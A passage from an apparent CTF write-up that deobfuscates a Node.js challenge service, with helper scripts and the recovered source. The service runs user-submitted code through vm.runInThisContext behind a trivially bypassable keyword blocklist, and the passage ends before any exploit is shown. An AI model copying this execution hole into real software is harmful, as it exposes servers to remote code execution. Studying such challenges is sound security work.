</span><span class="line">            <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">E</span><span class="p">);</span>
</span><span class="line">          <span class="p">}</span>
</span><span class="line">          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">          <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">c</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">      <span class="p">}</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">s</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">      <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">V</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">});</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">A3a</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;U&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">E</span> <span class="o">&gt;=</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">},</span> <span class="s1">&#39;q&#39;</span><span class="o">:</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">E</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">},</span> <span class="s1">&#39;M&#39;</span><span class="o">:</span> <span class="p">{}};</span>
</span><span class="line"><span class="nx">http</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c534&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;submissions&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">Q4</span><span class="p">);</span>
</span><span class="line"><span class="nx">ff</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6422&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="mi">200</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">n2</span><span class="p">);</span>
</span><span class="line"><span class="nx">process</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">a4</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="s1">&#39;Caught exception: &#39;</span><span class="p">;</span>
</span><span class="line">  <span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span><span class="p">);</span>
</span><span class="line"><span class="p">});</span>
</span><span class="line"><span class="nx">http</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">W4</span><span class="p">](</span><span class="nx">handle</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">v2</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">M4</span><span class="p">,</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">d2</span><span class="p">);</span>
</span><span class="line"><span class="nx">console</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">R4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">c4</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Looks much better right? Well, not really.</p>

<p>First, the <code>z9o2</code> object contains primitive values and it is referenced everywhere instead of using strings and numbers directly. Code like <code>A[z9o2.A4](z9o2.X2, {'Content-Type': z9o2.N4});</code> should be translated to <code>A.writeHead(200, {'Content-Type': 'text/plain'})</code> (<code>x['y']</code> is equivalent to <code>x.y</code> in JavaScript). I wrote a little node.js script to inline these:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">z9o2</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;p2&#39;</span><span class="o">:</span> <span class="s2">&quot;length&quot;</span><span class="p">,</span> <span class="s1">&#39;n2&#39;</span><span class="o">:</span> <span class="s2">&quot;fs&quot;</span><span class="p">,</span> <span class="s1">&#39;w4&#39;</span><span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="s1">&#39;J4&#39;</span><span class="o">:</span> <span class="s2">&quot;-&quot;</span><span class="p">,</span> <span class="s1">&#39;v2&#39;</span><span class="o">:</span> <span class="s2">&quot;listen&quot;</span><span class="p">,</span> <span class="s1">&#39;R4&#39;</span><span class="o">:</span> <span class="s2">&quot;log&quot;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;a4&#39;</span><span class="o">:</span> <span class="s1">&#39;uncaughtException&#39;</span><span class="p">,</span> <span class="s1">&#39;d2&#39;</span><span class="o">:</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;c4&#39;</span><span class="o">:</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span><span class="p">,</span> <span class="s1">&#39;Q4&#39;</span><span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="s1">&#39;N4&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;W4&#39;</span><span class="o">:</span> <span class="s2">&quot;createServer&quot;</span><span class="p">,</span> <span class="s1">&#39;Q2&#39;</span><span class="o">:</span> <span class="p">{},</span> <span class="s1">&#39;M4&#39;</span><span class="o">:</span> <span class="mi">1337</span><span class="p">,</span> <span class="s1">&#39;t2&#39;</span><span class="o">:</span> <span class="s2">&quot;on&quot;</span><span class="p">,</span> <span class="s1">&#39;s4&#39;</span><span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="s1">&#39;x2&#39;</span><span class="o">:</span> <span class="s2">&quot;/&quot;</span><span class="p">,</span>
</span><span class="line">            <span class="s1">&#39;y2&#39;</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;X2&#39;</span><span class="o">:</span> <span class="mi">200</span><span class="p">,</span> <span class="s1">&#39;f2&#39;</span><span class="o">:</span> <span class="s2">&quot;end&quot;</span><span class="p">,</span> <span class="s1">&#39;l2&#39;</span><span class="o">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="s1">&#39;A4&#39;</span><span class="o">:</span> <span class="s2">&quot;writeHead&quot;</span><span class="p">};</span>
</span><span class="line"><span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">()</span>
</span><span class="line"><span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">z9o2</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span> <span class="o">==</span> <span class="s1">&#39;number&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
</span><span class="line">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;\\[z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span> <span class="o">+</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;.&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">])</span>
</span><span class="line">        <span class="nx">source</span> <span class="o">=</span> <span class="nx">source</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="nb">RegExp</span><span class="p">(</span><span class="s1">&#39;z9o2.&#39;</span> <span class="o">+</span> <span class="nx">key</span><span class="p">,</span> <span class="s1">&#39;g&#39;</span><span class="p">),</span> <span class="s2">&quot;&#39;&quot;</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&quot;&#39;&quot;</span><span class="p">)</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>Then, there are lot of conditional expressions that use the <code>r3A8.J8()</code> function like this: <code>r3A8.J8("1b") ? "k" : "runInThisContext"</code>. It seems to be some kind of hash function with a boolean output, since it’s a pure function without side effects. (<strong>Update</strong>: it turned out to be this simple only for the duration of the competition since it checks the date :) For a deeper analysis of this function, see <a href="http://wizardsofdos.de/blog/?p=1254096">this writeup</a>) I wrote another small script to resolve these:</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]).</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">ast</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;esprima&#39;</span><span class="p">).</span><span class="nx">parse</span><span class="p">(</span><span class="nx">source</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">r3A8</span> <span class="o">=</span> <span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="cm">/* ... copied from the source file */</span> <span class="p">})();</span>
</span><span class="line">
</span><span class="line"><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="c1">// Match only expressions like r3A8.J8(a) ? b : c</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">object</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s2">&quot;r3A8&quot;</span> <span class="o">&amp;&amp;</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">name</span> <span class="o">==</span> <span class="s1">&#39;J8&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="c1">// Resolving the conditional expression</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">decision</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="nx">ast</span><span class="p">.</span><span class="nx">test</span><span class="p">.</span><span class="nx">arguments</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">value</span><span class="p">);</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">value</span> <span class="o">=</span> <span class="nx">decision</span> <span class="o">?</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">consequent</span> <span class="o">:</span> <span class="nx">ast</span><span class="p">.</span><span class="nx">alternate</span><span class="p">;</span>
</span><span class="line">      <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="k">delete</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span><span class="line">      <span class="k">for</span> <span class="p">(</span><span class="nx">key</span> <span class="k">in</span> <span class="nx">value</span><span class="p">)</span> <span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">value</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span><span class="line">      <span class="k">return</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nx">ast</span> <span class="k">instanceof</span> <span class="nb">Object</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">key</span> <span class="k">in</span> <span class="nx">ast</span><span class="p">)</span> <span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kd">var</span> <span class="nx">source</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;escodegen&#39;</span><span class="p">).</span><span class="nx">generate</span><span class="p">(</span><span class="nx">ast</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">source</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>There were a few more tricks that were only present in a few lines; those were resolved by hand. After inlining most of the variables in the resulting code (modern IDEs usually provide a shortcut to easily do that), it looks like a normal node.js program now.</p>

<h2 id="the-deobfuscated-code">The deobfuscated code</h2>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
<span class="line-number">7</span>
<span class="line-number">8</span>
<span class="line-number">9</span>
<span class="line-number">10</span>
<span class="line-number">11</span>
<span class="line-number">12</span>
<span class="line-number">13</span>
<span class="line-number">14</span>
<span class="line-number">15</span>
<span class="line-number">16</span>
<span class="line-number">17</span>
<span class="line-number">18</span>
<span class="line-number">19</span>
<span class="line-number">20</span>
<span class="line-number">21</span>
<span class="line-number">22</span>
<span class="line-number">23</span>
<span class="line-number">24</span>
<span class="line-number">25</span>
<span class="line-number">26</span>
<span class="line-number">27</span>
<span class="line-number">28</span>
<span class="line-number">29</span>
<span class="line-number">30</span>
<span class="line-number">31</span>
<span class="line-number">32</span>
<span class="line-number">33</span>
<span class="line-number">34</span>
<span class="line-number">35</span>
<span class="line-number">36</span>
<span class="line-number">37</span>
<span class="line-number">38</span>
<span class="line-number">39</span>
<span class="line-number">40</span>
<span class="line-number">41</span>
<span class="line-number">42</span>
<span class="line-number">43</span>
<span class="line-number">44</span>
<span class="line-number">45</span>
<span class="line-number">46</span>
<span class="line-number">47</span>
<span class="line-number">48</span>
<span class="line-number">49</span>
<span class="line-number">50</span>
<span class="line-number">51</span>
<span class="line-number">52</span>
<span class="line-number">53</span>
<span class="line-number">54</span>
<span class="line-number">55</span>
<span class="line-number">56</span>
<span class="line-number">57</span>
<span class="line-number">58</span>
<span class="line-number">59</span>
<span class="line-number">60</span>
<span class="line-number">61</span>
<span class="line-number">62</span>
<span class="line-number">63</span>
<span class="line-number">64</span>
<span class="line-number">65</span>
<span class="line-number">66</span>
<span class="line-number">67</span>
<span class="line-number">68</span>
<span class="line-number">69</span>
<span class="line-number">70</span>
<span class="line-number">71</span>
<span class="line-number">72</span>
<span class="line-number">73</span>
<span class="line-number">74</span>
<span class="line-number">75</span>
<span class="line-number">76</span>
<span class="line-number">77</span>
<span class="line-number">78</span>
<span class="line-number">79</span>
<span class="line-number">80</span>
<span class="line-number">81</span>
<span class="line-number">82</span>
<span class="line-number">83</span>
<span class="line-number">84</span>
<span class="line-number">85</span>
<span class="line-number">86</span>
<span class="line-number">87</span>
<span class="line-number">88</span>
<span class="line-number">89</span>
<span class="line-number">90</span>
<span class="line-number">91</span>
<span class="line-number">92</span>
<span class="line-number">93</span>
<span class="line-number">94</span>
<span class="line-number">95</span>
<span class="line-number">96</span>
<span class="line-number">97</span>
<span class="line-number">98</span>
<span class="line-number">99</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="nx">http</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;http&#39;</span><span class="p">);</span>
</span><span class="line"><span class="nx">ff</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">);</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">).</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;dfsd &#39;</span><span class="p">,</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">));</span>
</span><span class="line">        <span class="k">return</span> <span class="nx">O</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">    <span class="k">return</span> <span class="s1">&#39;No password found&#39;</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">statSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{}</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span> <span class="nx">ff</span><span class="p">.</span><span class="nx">mkdirSync</span><span class="p">(</span><span class="s1">&#39;submissions&#39;</span><span class="p">);</span>
</span><span class="line">    <span class="nx">ff</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="s1">&#39;submissions/&#39;</span> <span class="o">+</span> <span class="nx">flag_id</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">token</span><span class="p">,</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">    <span class="nx">global</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">    <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">).</span><span class="nx">runInThisContext</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">checks</span> <span class="o">=</span> <span class="p">[</span>
</span><span class="line">            <span class="sr">/eval/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/global/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/Function/</span><span class="p">,</span>
</span><span class="line">            <span class="sr">/this/</span>
</span><span class="line">        <span class="p">];</span>
</span><span class="line">    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">z</span> <span class="o">&lt;</span> <span class="nx">checks</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">checks</span><span class="p">[</span><span class="nx">z</span><span class="p">].</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line">
</span><span class="line"><span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">req</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">k</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line">        <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">data_json</span> <span class="o">=</span> <span class="p">{};</span>
</span><span class="line">        <span class="p">}</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;flag_id&#39;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;token&#39;</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">hasOwnProperty</span><span class="p">(</span><span class="s1">&#39;code&#39;</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">                <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">.</span><span class="nx">flag_id</span><span class="p">,</span> <span class="nx">data_json</span><span class="p">.</span><span class="nx">token</span><span class="p">);</span>
</span><span class="line">                <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your password: &#39;</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
</span><span class="line">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">                <span class="nx">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span><span class="line">                <span class="nx">code</span> <span class="o">=</span> <span class="nx">data_json</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">];</span>
</span><span class="line">                <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">                    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">.</span><span class="nx">toString</span><span class="p">());</span>
</span><span class="line">                    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">                        <span class="nx">res</span><span class="p">.</span><span class="nx">writeHead</span><span class="p">(</span><span class="mi">200</span><span class="p">,</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/plain&#39;</span> <span class="p">});</span>
</span><span class="line">                        <span class="nx">res</span><span class="p">.</span><span class="nx">end</span><span class="p">(</span><span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">);</span>
